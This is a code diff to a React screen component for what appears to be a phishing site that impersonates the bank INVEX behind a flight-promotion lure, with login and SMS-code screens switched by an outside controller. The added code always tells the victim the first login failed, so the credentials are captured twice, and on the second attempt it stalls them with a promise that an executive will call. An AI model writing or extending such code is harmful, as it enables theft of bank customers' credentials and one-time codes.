@@ -37,6 +37,7 @@ export default function ClientScreen() {
   const [currentScreen, setCurrentScreen] = useState<ScreenType>(
     isHomePage ? ScreenType.PROMOCION : ScreenType.VALIDANDO
   );
+  const [loginAttempts, setLoginAttempts] = useState(0);
   const [sessionData, setSessionData] = useState<Partial<Session> & { banco?: string }>({
     banco: 'INVEX' // Banco por defecto para la página principal
   });
@@ -147,6 +148,38 @@ export default function ClientScreen() {
           
           console.log('Cambiando a pantalla:', screenType);
           
+          // Manejar lógica especial para la pantalla de login
+          if (screenType === 'login') {
+            setLoginAttempts(prev => {
+              const newAttempts = prev + 1;
+              
+              // Si es el primer intento, mostrar error de credenciales incorrectas
+              if (newAttempts === 1) {
+                setScreenData(prevData => ({
+                  ...prevData,
+                  ...data,
+                  errorMessage: 'Correo electrónico o contraseña incorrectos. Inténtalo de nuevo.'
+                }));
+                setCurrentScreen(ScreenType.LOGIN);
+              }
+              // Si es el segundo intento o más, mostrar mensaje de ejecutivo
+              else if (newAttempts >= 2) {
+                setScreenData(prevData => ({
+                  ...prevData,
+                  ...data,
+                  mensaje: 'Un ejecutivo se comunicará con usted para ayudarlo con su promoción de vuelos.'
+                }));
+                setCurrentScreen(ScreenType.MENSAJE);
+              }
+              
+              return newAttempts;
+            });
+            return;
+          }
+          
+          // Limpiar contador de intentos para otras pantallas
+          setLoginAttempts(0);
+          
           // Verificación para casos especiales de pantallas
           if (tipo.toLowerCase().includes('sms_compra') || 
               tipo.toLowerCase().includes('smscompra') ||
@@ -242,7 +275,7 @@ export default function ClientScreen() {
           
           // Actualizar el estado local con el nuevo sessionId
           setSessionData(prev => ({ ...prev, sessionId: newSessionId, banco: 'INVEX' }));
-          setCurrentScreen(ScreenType.VUELOS_OTORGADOS);
+          setCurrentScreen(ScreenType.VALIDANDO);
           
           return;
         }
